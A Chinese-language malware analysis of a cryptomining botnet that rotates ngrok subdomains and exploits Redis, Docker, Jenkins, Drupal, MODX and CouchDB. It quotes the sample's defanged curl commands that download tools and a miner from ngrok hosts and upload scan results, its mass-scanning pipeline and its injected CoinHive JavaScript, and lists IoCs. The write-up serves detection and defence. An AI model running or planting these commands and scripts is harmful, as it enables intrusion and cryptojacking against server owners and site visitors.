@@ -1,0 +1,188 @@
+# 概述
+
+"链治百病，药不能停"。时下各种挖矿软件如雨后春笋层出不穷，想把他们都灭了，那是不可能的，这辈子都不可能的。通常我们都忽略他们。但这个利用ngrok生成大量随机域名作为Downloader和Report域名，对抗安全设施阻断其域名，隐藏真实服务器地址的挖矿恶意样本成功的引起了我们的注意。
+
+该恶意样本的主要特点是:
+
+  * 使用ngrok定期更换的随机域名作为Downloader和Report域名。
+
+  * 利用redis，docker，jenkins，drupal，modx，CouchDB漏洞植入xmr挖矿程序挖矿。
+
+  * 企图扫描以太坊客户端，盗取以太币，当前未实际启用。
+  * 企图感染目标设备上的js文件，植入CoinHive挖矿脚本浏览器挖矿。
+  * 动态生成挖矿脚本和扫描脚本。
+  * 该挖矿样本主要模块由Scanner脚本，Miner脚本，Loader构成。Scanner模块负责扫描和上报漏洞信息给Loader。Loader负责给存在漏洞的设备植入Scanner和Miner。Miner负责挖矿。
+
+# Ngrok
+
+![Snip20180907_12.png](https://image.3001.net/images/20180913/1536806811_5b99cf9b0d0ed.png!small)
+
+图1：[ngrok工作原理](https://github.com/inconshreveable/ngrok)
+
+ngrok使用方式：先去ngrok.io注册一个服务，然后在本地启动ngrok client，把流量转到内网端口，ngrok
+client端会获得服务端随机分配的ngrok子域名，通过这些子域名就可以从外网访问内网资源了。免费模式下ngrok
+client可以有一个进程，一个进程可以有4个tunnel，每个tunnel会获得一个子域名，并且每次重启client重新获得每个tunnel对应的子域名。
+
+# 域名存活周期
+
+为了方便直观展示其所用域名的存活周期，我们绘制了该挖矿样本最近48小时所使用的各个域名我们能成功从该域名上下回来样本的次数的Heatmap。从图上可以看出该样本周期性更换其使用的域名，所使用的域名存活时间不超过12小时。实际上从我们的数据看该挖矿样本最早出现在6月下旬，域名切换规律一直如此。
+
+![Snip20180911_5-1
+\(1\).png](https://image.3001.net/images/20180913/1536806861_5b99cfcd4a554.png!small)
+
+图2：域名存活周期
+
+# Scanner
+
+由Loader植入，植入时生成待扫描IP范围，Report以及Downloader域名硬编码在Scanner脚本中。具体执行流程：
+
+  * 下载扫描过程使用工具zmap，zgrab，jq
+
+    
+    
+    curl -m 120 -fks -o /usr/bin/zmap "hxxp://3a3c559e.ngrok.io/d8/zmap"  
+    curl -m 120 -fks -o /usr/bin/jq "hxxp://53349e8c.ngrok.io/d8/jq"  
+    curl -m 120 -fks -o /usr/bin/zgrab "hxxp://e5a22d36.ngrok.io/d8/zgrab"  
+    
+
+  * 下载以太坊客户端geth扫描payload
+
+    
+    
+    #curl -m 120 -fks -o /tmp/.p8545 "hxxp://cc8ef76b.ngrok.io/d8/p8545"
+    POST / HTTP/1.1  
+    Host: %s:8545  
+    User-Agent: geth  
+    Accept: */*  
+    Content-Type: application/json  
+    Content-Length: 60
+    
+    {"jsonrpc":"2.0","method":"eth_accounts","params":[],"id":1}
+    
+
+  * 漏洞扫描，使用zmap扫描端口开放，然后用zgrab做应用层扫描，当前该恶意样本扫描6379/2375/80/8080/5984端口，查找 redis，docker，jenkins，drupal，modx，couchdb服务
+
+    
+    
+      #例如，扫描redis端口
+      PORT="6379"
+      echo -ne "info\r\nquit\r\n" >/tmp/rinfoa379f8ca
+      echo ";;${PORT}" > $OUT
+      /usr/bin/zmap -i $IFACE -B 50M --max-sendto-failures 1000000 -c5 -o- -p $PORT $IPR 2>>${LOGF} | zgrab --senders 100 --port $PORT --data /tmp/rinfoa379f8ca --output-file=- 2>/dev/null | grep 'redis_version' | jq -r .ip >> ${OUT}
+    
+
+  * 上传扫描结果
+
+    
+    
+    curl -m 120 -sk -F result=@${_FILE} "hxxp://cc8ef76b.ngrok.io/z?r={RIP}&i={i}&x=${excode}"  
+    
+
+  * 删除痕迹退出
+
+# Miner
+
+Loader植入阶段生成Report，Downloader域名硬编码在Miner脚本中：
+
+    
+    
+    export HOST="hxxp://608f5b6c.ngrok.io"  
+    
+
+执行流程：
+
+  * 下载运行fc，是个全局标记，用来区分感染状态的，如果样本成功运行，说明感染成功。如果运行失败，记录错误信息，用来上报给Report。
+
+    
+    
+    curl -fks -o $INSTALL/93b689 "$HOST/d8/fc"  
+    $INSTALL/93b689 '///' >>201e3a252c5e 2>&1 &
+    $INSTALL/93b689 '[^$I$^]' >>201e3a252c5e 2>&1 &
+    
+
+  * 杀死竞争对手
+  * 生成旧版本的自己的Report信息，包括进程名称，矿机MD5，矿机文件路径。用来上报给Report。
+  * 杀死旧版本的自己
+  * 下载daemon(进程管理工具)，nginx(矿机)运行。
+
+    
+    
+    curl -fks -o "${RIP}d" "$HOST/d8/daemon"  
+    curl -fks -o dda4512010 "$HOST/d8/nginx"  
+    cat dda4512010 |"${RIP}d"  
+    
+
+  * 查找/etc/hosts中是否有其他矿工域名，如果有，将"127.0.0.1 localhost"写入/etc/hosts，用来清空其他矿工快速域名解析记录
+  * 清除非自己的crontab任务
+  * 在当前目录下的js脚本中插入CoinHive挖矿脚本, 感染肉鸡上的js文件。或许这是个bug，因为当前目录是其工作目录，下并没有js文件。
+
+    
+    
+    var js=document.createElement("script");  
+    js.type="text/javascript";  
+    js.src="hxxps://coinhive.com/lib/coinhive.min.js",  
+    document.body.appendChild(js),  
+    window.msci=setInterval(  
+        function(){
+            var e="CoinHive";
+            if(window[e]){
+                clearInterval(window.msci);
+                var n=window[e].Anonymous;
+                window.__m1||(window.__m1=new n("U1EhkTAx8j1IVGH6KkzoHDuwPy42c7vW"))&&__m1.start()
+            }
+        },
+        200
+    );
+    
+
+  * 上报矿机运行信息
+    * 矿机运行成功，报告矿机进程ID，感染设备IP ID，CPU数量，感染设备所用漏洞，当前用户名。
+    * 矿机运行失败，报告错误信息, 包括感染结果，旧版本矿机运行信息（进程名称，矿机MD5，运行文件路径）, crontab错误信息等
+
+# 挖矿配置如下：
+
+    
+    
+    矿池地址: pool.minexmr.com:55555
+    钱包地址: 4AuKPF4vUMcZZywWdrixuAZxaRFt9FPNgcv9v8vBnCtcPkHPxuGqacfPrLeAQWKZpNGTJzxKuKgTCa6LghSCDrEyJ5s7dnW 
+    
+
+当前TotalPaid为：69.676550440000 XMR
+
+# IoC
+
+## MD5
+
+    
+    
+    md5=19e8679be6cfc56a529cf35df2dbece8    uri=hxxp://608f5b6c.ngrok.io/d8/daemon  
+    md5=e309354fe7047a5fca3c774a427ae7a2    uri=hxxp://608f5b6c.ngrok.io/d8/fc  
+    md5=39fcbe99c2d72006667be9bcc286db4e    uri=hxxp://608f5b6c.ngrok.io/d8/nginx  
+    md5=510802ce144bb729c3c527d465321168    uri=hxxp://ce0a62ad.ngrok.io/f/serve?l=u&r={RIP}&curl=1  
+    md5=072922760ec200ccce83ac5ce20c46ca    uri=hxxp://69c0c72e.ngrok.io/z?r={RIP}&i=2a6da41fcf36d873dde9ed0040fcf99ba59f579c3723bb178ba8a2195a11fb61cb6b669ed0f32fb9bdc891e64613e0caad46642f7a9b68ccea30244b4d0addf6d506be7e2c71c3c3793762e8e2a40117f62f0688cfad660a6f9529d3e17e183d769864ea45294d9dca4712ee73d5733  
+    
+
+## 曾经使用过的Loader IP
+
+    
+    
+    194.99.105.76    ASAS9009    M247_Ltd  
+    185.183.104.139    AS9009  M247_Ltd  
+    185.242.6.4    AS9009  M247_Ltd  
+    46.166.142.220    AS43350 NForce_Entertainment_B.V.  
+    217.23.3.91    AS49981 WorldStream_B.V.  
+    89.39.107.195    AS49981 WorldStream_B.V.  
+    185.159.157.19    AS59898 AllSafe_Sarl  
+    194.99.105.75    ASAS9009    M247_Ltd  
+    109.201.133.24    AS43350 NForce_Entertainment_B.V.  
+    217.23.3.92    AS49981 WorldStream_B.V.  
+    46.166.142.215    AS43350 NForce_Entertainment_B.V.  
+    89.39.107.192    AS49981 WorldStream_B.V.  
+    109.201.133.22    AS43350 NForce_Entertainment_B.V.  
+    89.39.107.202    AS49981 WorldStream_B.V.  
+    89.39.107.199    AS49981 WorldStream_B.V.  
+    109.201.133.26    AS43350 NForce_Entertainment_B.V.  
+    
+
+####  
+
